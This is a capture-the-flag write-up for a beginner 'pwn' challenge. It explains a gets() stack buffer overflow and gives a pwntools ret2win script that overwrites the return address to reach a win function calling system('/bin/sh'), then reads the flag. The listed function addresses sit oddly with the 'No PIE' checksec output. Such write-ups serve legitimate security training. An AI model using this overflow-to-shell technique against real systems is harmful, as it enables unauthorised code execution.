https://ctftime.org/event/2512

# Intro To Pwn

Classic win function pwn.

-ProfNinja

nc 0.cloud.chals.io 13545

## Analysis

We can see that there are no canaries and no PIE:

```
[*] '/Users/user/ctf/pwn/intro_to_pwn/pwnme'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

`vuln` @ `0x11b0`
- `gets(local_38)`
    - we can use this to control the return address on the stack

`win` @ `0x1196`
- calls `system("/bin/sh")`
- `0x119e` or `win`+8 is the address of the `lea`
    - returning here allows us to avoid unaligning the stack

## Solution

1) Send 0x38 bytes of data to reach the return address
2) Send an 8 byte value containing the address of `win`+8 to ret2win

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./pwnme", checksec=True)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("0.cloud.chals.io", 13545)

payload = b""
payload += b"A" * 0x38
payload += p64(elf.sym["win"] + 8)
p.sendline(payload)

p.sendline(b"/bin/cat flag.txt")

p.interactive() # udctf{h00r4y_I_am_a_pwn3r_n0w}
```

## Flag
`udctf{h00r4y_I_am_a_pwn3r_n0w}`

smiley 2024/11/10
